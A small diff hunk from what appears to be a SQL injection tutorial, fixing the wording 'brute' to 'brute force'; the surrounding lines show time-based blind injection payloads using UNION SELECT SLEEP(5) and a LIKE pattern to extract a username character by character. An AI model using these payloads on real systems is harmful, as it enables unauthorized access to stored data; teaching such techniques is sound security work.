@@ -108,7 +108,7 @@ admin' UNION SELECT SLEEP(5),2;--
 A 5-second delay means the condition was true; an instant response means that
 either the target is not vulnerable or requires more columns for the UNION, 
 because it is expecting more of an input. 
-Combined with `LIKE` you can brute a value one character at a time:
+Combined with `LIKE` you can brute force a value one character at a time:
 
 ```sql
 admin' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'a%';--
